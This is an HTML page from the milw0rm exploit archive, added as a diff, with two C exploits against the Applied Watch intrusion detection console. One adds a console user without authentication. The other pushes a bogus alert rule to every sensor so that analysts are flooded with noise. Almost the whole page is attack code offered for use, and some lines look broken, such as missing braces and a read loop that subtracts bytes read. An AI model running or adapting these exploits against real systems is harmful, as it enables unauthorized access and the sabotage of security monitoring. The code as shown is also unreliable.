@@ -1,0 +1,213 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+// appliedsnatch.c : a malicious individual on a network protected by 
+// the Applied Watch Solution can add new users to a console, 
+// without having to authenticate to the system.
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;openssl/ssl.h&gt;
+
+#define PUT_UINT32(i, val)\
+        {\
+          buf[(i) ++] = ((val) &gt;&gt; 24) &amp; 0xff;\
+          buf[(i) ++] = ((val) &gt;&gt; 16) &amp; 0xff;\
+          buf[(i) ++] = ((val) &gt;&gt; 8) &amp; 0xff;\
+          buf[(i) ++] = (val) &amp; 0xff;\
+        }
+
+int main(int argc, char *argv[])
+{
+  unsigned char *buf;
+  unsigned int idx, i;
+  size_t userlen, passlen, buflen, lenidx;
+  int sock;
+  struct sockaddr_in sin;
+  unsigned char respbuf[28];
+  ssize_t n;
+  SSL_CTX *sslctx;
+  SSL *ssl;
+  
+  if (argc != 5) { fprintf(stderr, &quot;usage: %s &lt;host&gt; &lt;port&gt; &lt;user&gt; &lt;pass&gt;\n&quot;,
+argv[0]); exit(1); }
+  userlen = strlen(argv[3]);
+  passlen = strlen(argv[4]);
+  buf = malloc(buflen = 12 + 4 + userlen + 4 + 4 + passlen + 4 + 4 + 4);
+  memset(buf, 0, buflen);
+  idx = 0;
+  PUT_UINT32(idx, 0xbabe0001); /* 0xbabe0002 for other protocol ver */
+  PUT_UINT32(idx, 0x6a);
+  lenidx = idx;
+  PUT_UINT32(idx, 0xf00fc7c8);
+  //PUT_UINT32(idx, 0); /* uncomment for other protocol ver */
+  PUT_UINT32(idx, userlen);
+  memcpy(&amp;buf[idx], argv[3], userlen); idx += userlen;
+  idx |= 3; idx ++;
+  PUT_UINT32(idx, passlen);
+  memcpy(&amp;buf[idx], argv[4], passlen); idx += passlen;
+  idx |= 3; idx ++;
+  PUT_UINT32(idx, 0x1);
+  PUT_UINT32(idx, 0x1);
+  PUT_UINT32(lenidx, idx);
+  printf(&quot;connecting\n&quot;);
+  memset(&amp;sin, 0, sizeof(sin));
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons(atoi(argv[2]));
+  if ((sin.sin_addr.s_addr = inet_addr(argv[1])) == -1)
+  {
+    struct hostent *he;
+    
+    if ((he = gethostbyname(argv[1])) == NULL) { perror(&quot;gethostbyname()&quot;);
+exit(1); }
+    memcpy(&amp;sin.sin_addr, he-&gt;h_addr, 4);
+  }
+  sock = socket(AF_INET, SOCK_STREAM, 0);
+  if (connect(sock, (struct sockaddr *)&amp;sin, sizeof(sin)) != 0) {
+perror(&quot;connect()&quot;); exit(1); }
+  printf(&quot;doing ssl handshake\n&quot;);
+  SSL_load_error_strings();
+  SSL_library_init();
+  if ((sslctx = SSL_CTX_new(SSLv23_client_method())) == NULL) { fprintf(stderr,
+&quot;SSL_CTX_new()\n&quot;); exit(1); }
+  if ((ssl = SSL_new(sslctx)) == NULL) { fprintf(stderr, &quot;SSL_new()\n&quot;);
+exit(1); }
+  if (SSL_set_fd(ssl, sock) != 1) { fprintf(stderr, &quot;SSL_set_fd()\n&quot;); exit(1);
+  if (SSL_connect(ssl) != 1) { fprintf(stderr, &quot;SSL_connect()\n&quot;); exit(1); }
+  printf(&quot;sending %u bytes:\n&quot;, idx);
+  for (i = 0; i &lt; idx; i ++) printf(&quot;%.2x &quot;, buf[i]);
+  if (SSL_write(ssl, buf, idx) != idx) { perror(&quot;write()&quot;); exit(1); }
+  printf(&quot;\nreading:\n&quot;);
+  i = 0;
+  while (i &lt; sizeof(respbuf))
+  {
+    if ((n = SSL_read(ssl, &amp;respbuf[i], sizeof(respbuf) - i)) &lt; 0) {
+perror(&quot;read()&quot;); exit(1); }
+    i -= n;
+  }
+  for (i = 0; i &lt; sizeof(respbuf); i ++) printf(&quot;%.2x &quot;, respbuf[i]);
+  printf(&quot;\n&quot;);
+  printf(&quot;adding user \&quot;%s\&quot; with password \&quot;%s\&quot; %s\n&quot;, argv[3], argv[4],
+(memcmp(&amp;respbuf[16], &quot;\x00\x00\x00\x00&quot;, 4) == 0)? &quot;succeeded&quot; : &quot;failed&quot;);
+  SSL_shutdown(ssl);
+  close(sock);
+  return 0;
+}
+
+- --- end appliedsnatch.c ---
+
+
+
+// addrule.c, a malicious individual can
+// introduce custom IDS alerts to all sensor nodes on a network, allowing a
+// human denial-of-service attack against the security experts monitoring the
+// console.  This is a valid technique for subverting intrusion detection 
+// systems.  This is also a demonstration of the &quot;sometimes good packets look
+// like bad packets, while bad packets go unnoticed by the intrusion detection
+// system&quot; concept.
+
+- --- begin addrule.c ---
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;openssl/ssl.h&gt;
+
+#define PUT_UINT32(i, val)\
+        {\
+          buf[(i) ++] = ((val) &gt;&gt; 24) &amp; 0xff;\
+          buf[(i) ++] = ((val) &gt;&gt; 16) &amp; 0xff;\
+          buf[(i) ++] = ((val) &gt;&gt; 8) &amp; 0xff;\
+          buf[(i) ++] = (val) &amp; 0xff;\
+        }
+
+int main(int argc, char *argv[])
+{
+  unsigned char *buf;
+  unsigned int idx, i;
+  size_t rulelen, buflen, lenidx;
+  int sock;
+  struct sockaddr_in sin;
+  unsigned char respbuf[28];
+  ssize_t n;
+  SSL_CTX *sslctx;
+  SSL *ssl;
+  unsigned char *ruleset = &quot;alert tcp any any -&gt; any any (msg: \&quot;*GOBBLE*
+*GOBBLE* *GOBBLE* *GOBBLE* \\:PpppppPPppppppPPPPPPpppp\&quot;;)&quot;;
+  
+  if (argc != 3) { fprintf(stderr, &quot;usage: %s &lt;host&gt; &lt;port&gt;\n&quot;, argv[0]);
+exit(1); }
+  rulelen = strlen(ruleset);
+  buf = malloc(buflen = 12 + 4 + 4 + 4 + rulelen + 4);
+  memset(buf, 0, buflen);
+  idx = 0;
+  PUT_UINT32(idx, 0xbabe0001); /* 0xbabe0002 for other protocol ver */
+  PUT_UINT32(idx, 0x6f);
+  lenidx = idx;
+  PUT_UINT32(idx, 0xf00fc7c8);
+  //PUT_UINT32(idx, 0); /* uncomment for other protocol ver */
+  PUT_UINT32(idx, 0);
+  PUT_UINT32(idx, 1);
+  PUT_UINT32(idx, rulelen);
+  memcpy(&amp;buf[idx], ruleset, rulelen); idx += rulelen;
+  idx |= 3; idx ++;
+  PUT_UINT32(lenidx, idx);
+  printf(&quot;connecting\n&quot;);
+  memset(&amp;sin, 0, sizeof(sin));
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons(atoi(argv[2]));
+  if ((sin.sin_addr.s_addr = inet_addr(argv[1])) == -1)
+  {
+    struct hostent *he;
+    
+    if ((he = gethostbyname(argv[1])) == NULL) { perror(&quot;gethostbyname()&quot;);
+exit(1); }
+    memcpy(&amp;sin.sin_addr, he-&gt;h_addr, 4);
+  }
+  sock = socket(AF_INET, SOCK_STREAM, 0);
+  if (connect(sock, (struct sockaddr *)&amp;sin, sizeof(sin)) != 0) {
+perror(&quot;connect()&quot;); exit(1); }
+  printf(&quot;doing ssl handshake\n&quot;);
+  SSL_load_error_strings();
+  SSL_library_init();
+  if ((sslctx = SSL_CTX_new(SSLv23_client_method())) == NULL) { fprintf(stderr,
+&quot;SSL_CTX_new()\n&quot;); exit(1); }
+  if ((ssl = SSL_new(sslctx)) == NULL) { fprintf(stderr, &quot;SSL_new()\n&quot;);
+exit(1); }
+  if (SSL_set_fd(ssl, sock) != 1) { fprintf(stderr, &quot;SSL_set_fd()\n&quot;); exit(1);
+  if (SSL_connect(ssl) != 1) { fprintf(stderr, &quot;SSL_connect()\n&quot;); exit(1); }
+  printf(&quot;sending %u bytes:\n&quot;, idx);
+  for (i = 0; i &lt; idx; i ++) printf(&quot;%.2x &quot;, buf[i]);
+  if (SSL_write(ssl, buf, idx) != idx) { perror(&quot;write()&quot;); exit(1); }
+  printf(&quot;\nreading:\n&quot;);
+  i = 0;
+  while (i &lt; sizeof(respbuf))
+  {
+    if ((n = SSL_read(ssl, &amp;respbuf[i], sizeof(respbuf) - i)) &lt; 0) {
+perror(&quot;read()&quot;); exit(1); }
+    i -= n;
+  }
+  for (i = 0; i &lt; sizeof(respbuf); i ++) printf(&quot;%.2x &quot;, respbuf[i]);
+  printf(&quot;\n&quot;);
+  printf(&quot;adding nasty ruleset %s\n&quot;, (memcmp(&amp;respbuf[16], &quot;\x00\x00\x00\x00&quot;,
+4) == 0)? &quot;succeeded&quot; : &quot;failed&quot;);
+  SSL_shutdown(ssl);
+  close(sock);
+  return 0;
+}
+</pre>
+//downloaded from milw0rm.com
+</html>
